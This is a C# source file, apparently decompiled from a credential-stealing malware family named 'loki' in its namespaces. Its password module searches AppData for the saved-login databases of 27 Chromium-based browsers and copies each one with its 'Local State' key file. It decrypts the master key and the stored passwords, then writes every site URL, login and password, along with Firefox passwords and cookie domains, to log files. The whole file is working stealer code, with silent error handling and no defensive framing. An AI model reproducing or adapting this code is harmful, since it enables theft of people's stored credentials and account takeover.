using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using Anubis;
using loki.loki.Stealer.Cookies;
using loki.loki.Utilies.Hardware;

namespace loki.loki.Stealer.Passwords;

public static class GetPasswords
{
	private class PassData
	{
		public string Url { get; set; }

		public string Login { get; set; }

		public string Password { get; set; }
	}

	public static List<string> profile_list = new List<string>();

	public static List<string> browser_name_list = new List<string>();

	public static List<string> url = new List<string>();

	public static List<string> login = new List<string>();

	public static List<string> password = new List<string>();

	public static List<string> passwors = new List<string>();

	public static List<string> credential = new List<string>();

	private static readonly string bd = Path.GetTempPath() + "\\bd" + Hardware.guid + ".tmp";

	private static readonly string ls = Path.GetTempPath() + "\\ls" + Hardware.guid + ".tmp";

	public static int Cpassword;

	private static readonly string[] BrowsersName = new string[27]
	{
		"Chrome", "Edge", "Yandex", "Orbitum", "Opera", "Amigo", "Torch", "Comodo", "CentBrowser", "Go!",
		"uCozMedia", "Rockmelt", "Sleipnir", "SRWare Iron", "Vivaldi", "Sputnik", "Maxthon", "AcWebBrowser", "Epic Browser", "MapleStudio",
		"BlackHawk", "Flock", "CoolNovo", "Baidu Spark", "Titan Browser", "Google", "browser"
	};

	public static void Passwords_Grab(string profilePath, string browser_name, string profile)
	{
		try
		{
			Path.Combine(profilePath, "Login Data");
			browser_name_list.Add(browser_name);
			profile_list.Add(profile);
			List<string> list = new List<string>();
			string roamingAppData = Browser_Parse.RoamingAppData;
			string localAppData = Browser_Parse.LocalAppData;
			List<string> list2 = new List<string>();
			list2.Add(roamingAppData);
			list2.Add(localAppData);
			List<string> list3 = new List<string>();
			foreach (string item in list2)
			{
				try
				{
					list3.AddRange(Directory.GetDirectories(item));
				}
				catch
				{
				}
			}
			foreach (string item2 in list3)
			{
				string[] array = null;
				try
				{
					list.AddRange(Directory.GetFiles(item2, "Login Data", SearchOption.AllDirectories));
					array = Directory.GetFiles(item2, "Login Data", SearchOption.AllDirectories);
				}
				catch
				{
				}
				if (array == null)
				{
					continue;
				}
				string[] array2 = array;
				foreach (string text in array2)
				{
					try
					{
						if (!File.Exists(text))
						{
							continue;
						}
						string text2 = "Unknown";
						string[] browsersName = BrowsersName;
						foreach (string text3 in browsersName)
						{
							if (item2.Contains(text3))
							{
								text2 = text3;
							}
						}
						string sourceFileName = text;
						string sourceFileName2 = text + "\\..\\..\\Local State";
						if (File.Exists(bd))
						{
							File.Delete(bd);
						}
						if (File.Exists(ls))
						{
							File.Delete(ls);
						}
						File.Copy(sourceFileName, bd);
						string destFileName = ls;
						File.Copy(sourceFileName2, destFileName);
						SqlHandler sqlHandler = new SqlHandler(bd);
						new List<PassData>();
						sqlHandler.ReadTable("logins");
						string text4 = File.ReadAllText(ls);
						string[] array3 = Regex.Split(text4, "\"");
						int num = 0;
						string[] array4 = array3;
						foreach (string text5 in array4)
						{
							if (!(text5 == "encrypted_key"))
							{
								num++;
								continue;
							}
							text4 = array3[num + 2];
							break;
						}
						byte[] key = DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text4)).Remove(0, 5)));
						int rowCount = sqlHandler.GetRowCount();
						for (int l = 0; l < rowCount; l++)
						{
							try
							{
								string value = sqlHandler.GetValue(l, 5);
								byte[] bytes = Encoding.Default.GetBytes(value);
								string text6 = "";
								try
								{
									if (!value.StartsWith("v10") && !value.StartsWith("v11"))
									{
										text6 = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes));
									}
									else
									{
										byte[] iv = bytes.Skip(3).Take(12).ToArray();
										text6 = AesGcm256.Decrypt(bytes.Skip(15).ToArray(), key, iv);
									}
								}
								catch
								{
								}
								credential.Add("Site_Url : " + sqlHandler.GetValue(l, 1).Trim() + Environment.NewLine + "Login : " + sqlHandler.GetValue(l, 3).Trim() + Environment.NewLine + "Password : " + text6.Trim() + Environment.NewLine);
								Cpassword++;
							}
							catch
							{
							}
						}
						foreach (string item3 in credential)
						{
							password.Add("Browser : " + text2 + Environment.NewLine + "Profile : " + profile + Environment.NewLine + item3);
						}
						credential.Clear();
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	public static void Write_Passwords()
	{
		using (StreamWriter streamWriter = new StreamWriter(Program.dir + "\\passwords.log"))
		{
			foreach (string item in password)
			{
				streamWriter.Write(item);
				streamWriter.Write(Environment.NewLine);
			}
			for (int i = 0; i < mozila.passwors.Count(); i++)
			{
				streamWriter.Write(mozila.passwors[i]);
				streamWriter.Write(Environment.NewLine);
			}
		}
		using StreamWriter streamWriter2 = new StreamWriter(Program.dir + "\\cookieDomains.log");
		foreach (string domain in GetCookies.domains)
		{
			streamWriter2.Write(domain);
			streamWriter2.Write(Environment.NewLine);
		}
	}
}
